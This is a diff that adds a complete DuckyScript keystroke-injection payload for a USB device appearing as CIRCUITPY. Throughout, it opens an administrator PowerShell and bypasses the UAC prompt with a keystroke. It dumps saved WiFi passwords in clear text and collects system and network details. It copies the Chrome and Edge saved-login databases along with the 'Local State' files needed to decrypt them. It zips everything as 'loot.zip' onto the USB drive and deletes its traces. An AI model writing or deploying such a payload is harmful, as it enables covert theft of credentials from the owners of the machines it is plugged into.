@@ -1,0 +1,72 @@
+DELAY 2000
+
+REM === Open PowerShell as Admin ===
+GUI r
+DELAY 800
+STRING powershell
+DELAY 500
+CTRL-SHIFT ENTER
+DELAY 4000
+ALT y
+DELAY 2500
+
+REM === Get CIRCUITPY Drive Letter ===
+STRING $drive = Get-WMIObject Win32_Volume | Where-Object { $_.Label -eq "CIRCUITPY" } | Select-Object -ExpandProperty DriveLetter
+ENTER
+DELAY 1000
+
+REM === Create Temp Folder ===
+STRING $temp = "$env:TEMP\duckydump"
+ENTER
+STRING New-Item -ItemType Directory -Force -Path $temp
+ENTER
+DELAY 500
+
+REM === Dump WiFi Passwords ===
+STRING (netsh wlan show profiles | Select-String "All User Profile") | ForEach-Object { $name = ($_ -split ':')[1].Trim(); netsh wlan show profile name="$name" key=clear } | Out-File "$temp\wifi-passwords.txt"
+ENTER
+DELAY 1500
+
+REM === Dump System Info ===
+STRING systeminfo > "$temp\sysinfo.txt"; ipconfig /all >> "$temp\sysinfo.txt"
+ENTER
+DELAY 1000
+
+REM === Copy Browser Login DBs (Chrome & Edge) ===
+STRING $chrome = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
+ENTER
+STRING $edge = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
+ENTER
+
+STRING if (Test-Path $chrome) { Copy-Item $chrome -Destination "$temp\chrome_login_db" -Force }
+ENTER
+STRING if (Test-Path $edge) { Copy-Item $edge -Destination "$temp\edge_login_db" -Force }
+ENTER
+DELAY 1000
+
+REM === Copy Chrome 'Local State' File (for password decryption) ===
+STRING $chromeState = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
+ENTER
+STRING if (Test-Path $chromeState) { Copy-Item $chromeState -Destination "$temp\chrome_local_state" -Force }
+ENTER
+DELAY 1000
+
+REM === Copy Edge 'Local State' File (for password decryption) ===
+STRING $edgeState = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State"
+ENTER
+STRING if (Test-Path $edgeState) { Copy-Item $edgeState -Destination "$temp\edge_local_state" -Force }
+ENTER
+DELAY 1000
+
+REM === Compress Everything ===
+STRING Compress-Archive -Path "$temp\*" -DestinationPath "$drive\loot.zip" -Force
+ENTER
+DELAY 1500
+
+REM === Clean Up ===
+STRING Remove-Item -Recurse -Force $temp
+ENTER
+DELAY 500
+
+STRING exit
+ENTER
